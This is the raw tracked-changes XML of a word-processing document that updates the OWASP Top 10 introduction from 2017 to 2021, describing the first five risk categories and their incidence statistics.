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B87C" w14:textId="4031356C" w:rsidR="00967B4C" w:rsidRPr="00AC649A" w:rsidRDefault="00855904" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b/>
          <w:sz w:val="32"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b/>
          <w:sz w:val="32"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>OWASP Top 10:</w:t>
      </w:r>
      <w:del w:id="0" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>201</w:delText>
        </w:r>
        <w:r w:rsidR="00B10F9D" w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>7</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E300D6">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>20</w:t>
        </w:r>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00E300D6">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r w:rsidRPr="00E300D6">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="766A3D98"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64C9DFA3"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"https://owasp.org/Top10/A00_2021_Introduction/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F954DF4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A00_2021_Introduction"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DDC4609" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>id:      "introduction"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56778A2E"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42FCE86B"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7B6D2550" w14:textId="3ADB44D4" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:del w:id="2" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">I </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253D631A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F0FABCB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">## Welcome to the OWASP Top 10 - </w:t>
      </w:r>
      <w:ins w:id="4" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>2021</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="573E724C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="5" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11B3A880" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="6" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="7" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>![</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>OWASP Top 10 Logo](./assets/TOP_10_logo_Final_Logo_Colour.png){:class="img-responsive"}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3453F6A4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="8" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1429B7A4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="9" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="10" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Welcome to the latest installment of the OWASP Top 10! The OWASP Top 10 2021 is all-new, with a new graphic design and an available one-page infographic you can print or obtain from our home page.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1F76BBB0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="11" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="290B0FC1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="12" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="13" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">A huge thank you to everyone that contributed their time and data for this iteration. Without you, this installment would not happen. **THANK </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>YOU!*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="28681729" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="14" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C4D54A4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="15" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="16" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## What's changed in the Top 10 for 2021</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7DB4DBC2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="17" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E5FACEC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="18" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="19" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>There are three new categories, four categories with naming and scoping changes, and some consolidation in the Top 10 for 2021. We've changed names when necessary to focus on the root cause over the symptom.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="57798E8F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="20" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D5EDFF5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="21" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="22" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>![</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Mapping](assets/mapping.png)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6BC2BC4D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="23" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28BED162" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="24" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="25" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- **[A01:2021-Broken Access </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Control](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>A01_2021-Broken_Access_Control.md)** moves up from the fifth position to the category with the most serious web application security risk; the contributed data indicates that on average, 3.81% of applications tested had one or more Common Weakness Enumerations (CWEs) with more than 318k occurrences of CWEs in this risk category. The 34 CWEs mapped to Broken Access Control had more occurrences in applications than any other category.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="08EC55A1" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="26" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="27" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- **[A02:2021-Cryptographic </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Failures](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">A02_2021-Cryptographic_Failures.md)** shifts up one position to #2, previously known as </w:t>
        </w:r>
        <w:r w:rsidR="00474B8C">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*</w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*A3:</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>2017</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9DC871" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="28" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B73565F" w14:textId="2C0E8988" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="29" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="30" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-Sensitive Data Exposure**, which was broad symptom rather than a root cause. The renewed name focuses on failures related to cryptography as it has been implicitly before. </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:del w:id="31" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">major update adds several new issues, including two issues selected </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="32" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>category often leads to sensitive data exposure or system compromise.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="52C55613" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="33" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="34" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- **[A03:2021-</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Injection](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>A03_2021-Injection.md)** slides down to the third position. 94% of the applications were tested for some form of injection with a max incidence rate of 19%, an average incidence rate of 3.37%, and the 33 CWEs mapped into this category have the second most occurrences in applications with 274k occurrences. Cross-site Scripting is now part of this category in this edition.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7783EF64" w14:textId="44BEF0E3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="35" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="36" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- **[A04:2021-Insecure </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Design](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">A04_2021-Insecure_Design.md)** is a new category for 2021, with a focus on risks related to design flaws. If we genuinely want to "move left" as an industry, we need more threat modeling, secure design patterns and principles, and reference architectures. An insecure design cannot be fixed </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">by </w:t>
      </w:r>
      <w:del w:id="37" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">the </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="38" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>a perfect implementation as by definition, needed security controls were never created to defend against specific attacks.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1B83BD07" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="39" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="40" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- **[A05:2021-Security </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Misconfiguration](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">A05_2021-Security_Misconfiguration.md)** moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration, with an average incidence rate of 4.5%, and over 208k occurrences of CWEs mapped to this risk category. With more shifts </w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>into highly configurable software, it's not surprising to see this category move up. The former category for **A4:2017-XML External Entities (XXE)** is now part of this risk category.</w:t>
        </w:r>
      </w:ins>
    </w:p>
